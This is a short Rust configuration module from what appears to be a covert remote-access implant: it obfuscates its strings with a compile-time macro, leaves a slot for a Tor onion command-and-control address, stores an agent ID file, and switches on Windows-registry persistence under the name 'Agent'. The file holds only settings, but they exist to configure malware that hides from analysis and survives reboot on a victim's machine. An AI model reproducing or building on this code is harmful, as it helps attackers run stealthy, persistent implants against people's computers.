use goldberg::goldberg_string;

#[inline]
pub fn get_address() -> String {
    // Put your onion domain here!!!
    goldberg_string!("").to_string()
}

#[inline]
pub fn get_id_path() -> String {
    goldberg_string!("agent.id").to_string()
}

#[allow(dead_code)]
pub enum Persistence {
    NO,
    WinRegistryBased,
}

#[inline]
pub fn persistence() -> Persistence {
    return Persistence::WinRegistryBased;
}

// Relates to Persistence::WinRegistryBased
#[inline]
pub fn get_reg_program_name() -> String {
    goldberg_string!("Agent").to_string()
}